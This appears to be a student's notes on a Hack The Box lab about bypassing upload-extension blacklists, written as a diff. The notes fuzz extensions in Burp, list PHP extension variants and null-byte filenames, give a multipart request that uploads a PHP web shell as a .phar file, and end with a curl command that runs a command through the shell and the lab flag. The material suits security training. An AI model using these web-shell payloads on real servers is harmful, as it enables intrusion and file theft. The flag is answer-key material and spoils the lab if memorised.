@@ -1,1 +1,79 @@
+Blacklist Filters
+In the previous section, we saw an example of a web application that only applied type validation controls on the front-end (i.e., client-side), which made it trivial to bypass these controls. This is why it is always recommended to implement all security-related controls on the back-end server, where attackers cannot directly manipulate it.
 
+Still, if the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.
+
+The exercise we find in this section is similar to the one we saw in the previous section, but it has a blacklist of disallowed extensions to prevent uploading web scripts. We will see why using a blacklist of common extensions may not be enough to prevent arbitrary file uploads and discuss several methods to bypass it.
+
+Blacklisting Extensions
+Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and filename with our PHP script's, and forward the request:
+
+There are generally two common forms of validating a file extension on the back-end:
+
+1. Testing against a blacklist of types
+2. Testing against a whitelist of types
+
+FUZZING EXTENSIONS
+
+There are many lists of extensions we can utilize in our fuzzing scan. PayloadsAllTheThings provides lists of extensions for PHP(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)  and .NET (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)  web applications. We may also use SecLists list of common Web Extensions (https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) .
+
+We may use any of the above lists for our fuzzing scan. As we are testing a PHP application, we will download and use the above PHP list. Then, from Burp History, we can locate our last request to /upload.php, right-click on it, and select Send to Intruder. From the Positions tab, we can Clear any automatically set positions, and then select the .php extension in filename="HTB.php" and click the Add button to add it as a fuzzing position:
+We can sort the results by Length, and we will see that all requests with the Content-Length (193) passed the extension validation, as they all responded with File successfully uploaded. In contrast, the rest responded with an error message saying Extension not allowed.
+
+Non-Blacklisted Extensions
+Now, we can try uploading a file using any of the allowed extensions from above, and some of them may allow us to execute PHP code. Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.
+
+Let's use the .phtml extension, which PHP web servers often allow for code execution rights. We can right-click on its request in the Intruder results and select Send to Repeater. Now, all we have to do is repeat what we have done in the previous two sections by changing the file name to use the .phtml extension and changing the content to that of a PHP web shell:
+
+As we can see, our file seems to have indeed been uploaded. The final step is to visit our upload file, which should be under the image upload directory (profile_images), as we saw in the previous section. Then, we can test executing a command, which should confirm that we successfully bypassed the blacklist and uploaded our web shell:
+
+URL - http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id
+
+CHALLENGE: 83.136.249.46:41523
+
+Question 1 - Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt"
+
+1) grab a random picture from the internet
+2) go to http://83.136.249.46:41523
+3) intercept the upload with burp -> send to intruder and use the word list below -> and change the file to rce.php and put the add $$ around .php for the wordlist below to find which works
+
+
+.jpeg.php
+.jpg.php
+.png.php
+.php
+.php3
+.php4
+.php5
+.php7
+.php8
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
+
+
+4) we see that we have a few respones with lengths of 230 lets use .phar 
+5) change botton of POST request to this -> 
+
+-----------------------------25911029204293377642742530356
+Content-Disposition: form-data; name="uploadFile"; filename="webshell.phar"
+
+Content-Type: image/png
+
+<?php system($_REQUEST['cmd']); ?>
+-----------------------------25911029204293377642742530356--
+
+6) we send request and see this on Response side: File successfully uploaded
+7) now we can curl to see the flag
+
+8) curl -s http://83.136.249.46:41523/profile_images/webshell.phar?cmd=cat+/flag.txt
+HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
